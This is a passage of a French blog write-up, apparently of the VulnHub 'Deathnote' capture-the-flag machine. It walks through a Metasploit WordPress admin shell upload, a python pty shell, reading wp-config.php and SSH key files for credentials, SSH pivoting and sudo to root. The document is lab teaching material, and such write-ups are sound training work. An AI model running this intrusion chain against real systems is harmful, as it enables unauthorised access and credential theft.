0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis le chemin de \u003Cstrong\u003EWordpress\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E TARGETURI \u002Fwordpress\nTARGETURI \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u002Fwordpress\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis le nom de l'utilisateur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E USERNAME kira\nUSERNAME \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E kira\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis le mot de passe.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E PASSWORD iamjustic3\nPASSWORD \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E iamjustic3\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEt on lance l'exploit.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fwebapp\u002Fwp_admin_shell_upload\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E run\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELe script s'ex√©cute correctement. On est connect√© au serveur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ meterpreter \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E shell\npython -c \u003Cspan class=\"token string\"\u003E'import pty; pty.spawn(\"\u002Fbin\u002Fsh\")'\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn trouve un fichier avec du \u003Cstrong\u003Ebrainfuck\u003C\u002Fstrong\u003E dans le r√©pertoire de l'utilisateur \"l\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fhome\u002Fl\u002Fuser.txt\n++++++++++\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E+\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E+++\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E+++++++\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E++++++++++\u003Cspan class=\"token operator\"\u003E&lt;&lt;&lt;\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E&lt;\u003C\u002Fspan\u003E-\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E+++++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E++.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E+++++++++++.------------.+.+++++.---.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E++++++++++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E--------------.++++++++.+++++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E.------------.---.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E++++++++++++++.-----------.---.+++++++\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.++++++++++++.------------.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E----------.+++++++++++++++++++.-.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E+++++.----------.++++++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E++.--------.-.++++++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E------------------.+++.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E----.+.++++++++++.-------.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E+++++++++++++++.-----.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E----.--.+++\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E+.--------.\u003Cspan class=\"token operator\"\u003E&lt;&lt;\u003C\u002Fspan\u003E.+++++++++++++.\u003Cspan class=\"token operator\"\u003E\u003E\u003E\u003C\u002Fspan\u003E++++++.--.+++++++++.-----------------.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003E\"i think u got the shell , but you wont be able to kill me -kira\". De toute √©vidence, c'est une fausse piste.\u003C\u002Fp\u003E\n\u003Cp\u003EEn consultant le r√©pertoire de l'utilisateur \"kira\", on trouve une info int√©ressante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fhome\u002Fkira\u002F.ssh\u002Fauthorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDyiW87OWKrV0KW13eKWJir58hT8IbC6Z61SZNh4Yzm9XlfTcCytDH56uhDOqtMR6jVzs9qCSXGQFLhc6IMPF69YMiK9yTU5ahT8LmfO0ObqSfSAGHaS0i5A73pxlqUTHHrzhB3\u002FJy93n0NfPqOX7HGkLBasYR0v\u002FIreR74iiBI0JseDxyrZCLcl6h9V0WiU0mjbPNBGOffz41CJN78y2YXBuUliOAj\u002F6vBi+wMyFF3jQhP4Su72ssLH1n\u002FE2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZsQtJsBQ9d3yvTD2k\u002FPOyhURC6MW0V\u002FaQICFZ6z l@deathnote\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ECela signifie que l'utilisateur \"l\" est enregistr√© dans \u003Cstrong\u003ESSH\u003C\u002Fstrong\u003E pour se connecter au compte de \"kira\".\u003C\u002Fp\u003E\n\u003Cp\u003EOn retrouve le mot de passe de l'utilisateur \"l\" dans le fichier de configuration de \u003Cstrong\u003EWordpress\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fvar\u002Fwww\u002Fdeathnote.vuln\u002Fwordpress\u002Fwp-config.php\n\u002F** MySQL database username *\u002F\ndefine\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E'DB_USER'\u003C\u002Fspan\u003E, \u003Cspan class=\"token string\"\u003E'l'\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E\n\n\u002F** MySQL database password *\u002F\ndefine\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E'DB_PASSWORD'\u003C\u002Fspan\u003E, \u003Cspan class=\"token string\"\u003E'death4me'\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E;\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn peut d√©sormais se connecter avec cet utilisateur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E l@\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E\nl@192.168.1.19's password: death4me\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EPuis se connecter avec le compte \"kira\" sans sp√©cifier de mot de passe.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E kira@localhost\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E1001\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ekira\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E1001\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ekira\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E1001\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ekira\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,27\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Esudo\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn trouve le premier flag.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E kira.txt\ncGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEn farvouillant partout, on trouve dans le r√©pertoire \"\u002Fopt\", un dossier \"L\" avec un indice\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fopt\u002FL\u002Ffake-notebook-rule\u002Fhint\nuse cyberchef\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis on consulte le fichier concern√©.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fopt\u002FL\u002Ffake-notebook-rule\u002Fcase.wav\n\u003Cspan class=\"token number\"\u003E63\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E47\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E46\u003C\u002Fspan\u003E 7a \u003Cspan class=\"token number\"\u003E63\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E64\u003C\u002Fspan\u003E 6b \u003Cspan class=\"token number\"\u003E49\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E44\u003C\u002Fspan\u003E 6f \u003Cspan class=\"token number\"\u003E67\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E61\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E32\u003C\u002Fspan\u003E 6c \u003Cspan class=\"token number\"\u003E79\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E59\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E57\u003C\u002Fspan\u003E 6c 7a 5a \u003Cspan class=\"token number\"\u003E58\u003C\u002Fspan\u003E 5a \u003Cspan class=\"token number\"\u003E70\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E62\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E43\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E41\u003C\u002Fspan\u003E 3d\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESur \u003Ca href=\"https:\u002F\u002Fgchq.github.io\u002FCyberChef\u002F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ecyberchef\u003C\u002Fa\u003E, en d√©codant cette chaine hexad√©cimal, on trouve la valeur en \u003Cstrong\u003EBase64\u003C\u002Fstrong\u003E \u003Ccode class=\"language-text\"\u003EcGFzc3dkIDoga2lyYWlzZXZpbCA=\u003C\u002Fcode\u003E que l'on d√©code avec la ligne de commande ci-dessous.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token builtin class-name\"\u003Eecho\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E'cGFzc3dkIDoga2lyYWlzZXZpbCA='\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E base64 -d\n\u003Cspan class=\"token function\"\u003Epasswd\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003E:\u003C\u002Fspan\u003E kiraisevil\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn a bien le mot de passe de l'utilisateur donc on peut consulter ses privil√®ges.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E -l\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003Esudo\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E password \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E kira: \nMatching Defaults entries \u003Cspan class=\"token keyword\"\u003Efor\u003C\u002Fspan\u003E kira on deathnote:\n    env_reset, mail_badpass, \u003Cspan class=\"token assign-left variable\"\u003Esecure_path\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u002Fusr\u002Flocal\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Flocal\u002Fbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fusr\u002Fbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fsbin\u003Cspan class=\"token punctuation\"\u003E\\\u003C\u002Fspan\u003E:\u002Fbin\n\nUser kira may run the following commands on deathnote:\n    \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EALL \u003Cspan class=\"token builtin class-name\"\u003E:\u003C\u002Fspan\u003E ALL\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E ALL\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EL'utilisateur a tous les droits.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E \u003Cspan class=\"token function\"\u003Ebash\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Froot\u002Froot.txt\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EPr√©ambule\u003C\u002Fh2\u003E\n\u003Cp\u003EIl existait une autre voie lors de l'√©num√©ration pour trouver le mot de passe de l'utilisateur \"l\". En effet, dans les fichiers d'upload, il y a un fichier contenant une liste de mots de passe √† l'adresse suivante \u003Ca href=\"http:\u002F\u002Fdeathnote.vuln\u002Fwordpress\u002Fwp-content\u002Fuploads\u002F2021\u002F07\u002Fnotes.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttp:\u002F\u002Fdeathnote.vuln\u002Fwordpress\u002Fwp-content\u002Fuploads\u002F2021\u002F07\u002Fnotes.txt\u003C\u002Fa\u003E. Ainsi, on aurait pu retrouver le mot de passe via l'outil de brute force \u003Cstrong\u003EHydra\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fdeathnote-1,739","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":5,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.8917d561.js" defer></script><script src="/assets/js/page--src-templates-post-vue.93f54eeb.js" defer></script>
  </body>
</html>
